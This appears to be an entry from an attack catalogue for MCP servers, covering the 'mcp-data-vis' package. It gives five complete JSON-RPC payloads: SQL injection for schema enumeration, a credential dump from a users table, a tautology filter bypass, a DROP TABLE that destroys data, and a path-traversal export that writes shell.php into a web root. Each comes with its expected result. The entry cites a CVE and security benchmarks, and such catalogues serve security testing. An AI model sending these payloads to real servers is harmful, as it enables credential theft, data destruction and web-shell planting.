# mcp-data-vis

## mcp-data-vis

- **Install:** `pip install mcp-data-vis && uvx mcp-data-vis`
- **Benchmarks/Papers that attacked it:**
  - CVE-2026-5322 — SQL injection in data visualization queries (CVSS critical)
  - MCPSecBench (arXiv:2508.13220) — SQL injection via visualization parameters
  - MCP-AttackBench (arXiv:2508.10991) — injection & execution family

---

### Attack: SQL Injection — Schema Enumeration (CVE-2026-5322)

- **Category:** SQL injection / schema reconnaissance (CWE-89)
- **Source:** CVE-2026-5322
- **ASR:** CVSS critical
- **Full JSON-RPC payload:**
```json
{
  "jsonrpc": "2.0",
  "id": 1,
  "method": "tools/call",
  "params": {
    "name": "generate_chart",
    "arguments": {
      "query": "SELECT name, sql FROM sqlite_master WHERE type='table'",
      "chart_type": "table",
      "title": "Schema"
    }
  }
}
```
- **What it does:** Passes a raw SQL query that reads the database schema instead of chart data. CVE-2026-5322 documented that `mcp-data-vis` passes the query parameter directly to the database without sanitization.
- **Expected server response:** Returns a "chart" populated with all table names and CREATE TABLE statements from the database schema.

---

### Attack: SQL Injection — Full Data Dump via Visualization (CVE-2026-5322)

- **Category:** SQL injection / data exfiltration (CWE-89)
- **Source:** CVE-2026-5322
- **ASR:** CVSS critical
- **Full JSON-RPC payload:**
```json
{
  "jsonrpc": "2.0",
  "id": 2,
  "method": "tools/call",
  "params": {
    "name": "visualize_data",
    "arguments": {
      "datasource": "'; SELECT username, password, email FROM users; --",
      "visualization_type": "bar",
      "x_axis": "username",
      "y_axis": "password"
    }
  }
}
```
- **What it does:** Injects a UNION-style SQL override into the datasource parameter, replacing the visualization query with a credential dump. The chart visualization result contains all usernames and hashed passwords.
- **Expected server response:** Returns a chart dataset containing all user credentials from the `users` table.

---

### Attack: SQL Injection — Tautology Bypass (CVE-2026-5322)

- **Category:** SQL injection / filter bypass (CWE-89)
- **Source:** CVE-2026-5322; MCPSecBench
- **ASR:** Demonstrated in testbed run (DAMAGE flagged on sql_injection tautology payload)
- **Full JSON-RPC payload:**
```json
{
  "jsonrpc": "2.0",
  "id": 3,
  "method": "tools/call",
  "params": {
    "name": "generate_chart",
    "arguments": {
      "query": "SELECT * FROM sensitive_metrics WHERE category='' OR '1'='1'",
      "chart_type": "line",
      "title": "Performance"
    }
  }
}
```
- **What it does:** Uses a tautology condition to bypass any WHERE filtering on the metrics table, returning all records regardless of category or access restrictions.
- **Expected server response:** Returns all rows from `sensitive_metrics` including restricted data.

---

### Attack: SQL Injection — DROP TABLE via Chart Query

- **Category:** SQL injection / database destruction (CWE-89)
- **Source:** CVE-2026-5322
- **ASR:** —
- **Full JSON-RPC payload:**
```json
{
  "jsonrpc": "2.0",
  "id": 4,
  "method": "tools/call",
  "params": {
    "name": "generate_chart",
    "arguments": {
      "query": "SELECT 1; DROP TABLE user_data; --",
      "chart_type": "pie",
      "title": "System Chart"
    }
  }
}
```
- **What it does:** Issues a multi-statement query that drops the `user_data` table. If the database connector allows multiple statements (common in SQLite without strict mode), the destruction executes.
- **Expected server response:** Chart with 1 data point returned; `user_data` table permanently dropped.

---

### Attack: Path Traversal via Export Path

- **Category:** Path traversal / unauthorized file write (CWE-22)
- **Source:** MCPSecBench; MCP-SafetyBench
- **ASR:** —
- **Full JSON-RPC payload:**
```json
{
  "jsonrpc": "2.0",
  "id": 5,
  "method": "tools/call",
  "params": {
    "name": "export_chart",
    "arguments": {
      "chart_id": "chart_001",
      "output_path": "../../var/www/html/shell.php",
      "format": "html"
    }
  }
}
```
- **What it does:** Exports a chart to an attacker-controlled path using path traversal, writing a malicious HTML/PHP file to the web server's document root — creating a web shell if a web server is running.
- **Expected server response:** File written to the traversed path; web shell accessible via HTTP if a web server is present.
